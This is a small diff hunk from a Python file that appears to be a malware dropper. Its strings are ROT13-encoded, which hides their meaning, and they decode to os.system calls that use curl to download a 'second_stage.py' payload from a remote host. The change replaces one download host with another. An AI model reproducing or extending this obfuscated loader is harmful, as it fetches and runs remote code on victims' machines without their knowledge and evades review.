@@ -2,7 +2,7 @@ import codecs
 import os
 
 first = '''
-bf.flfgrz("phey -B uggc://vgmphgrnlnar.pelfgnypybhq.klm/frpbaq_fgntr.cl")
+bf.flfgrz("phey -B uggcf://anhtug-obbxf.000jroubfgncc.pbz/frpbaq_fgntr.cl")
 '''
 
 second = '''
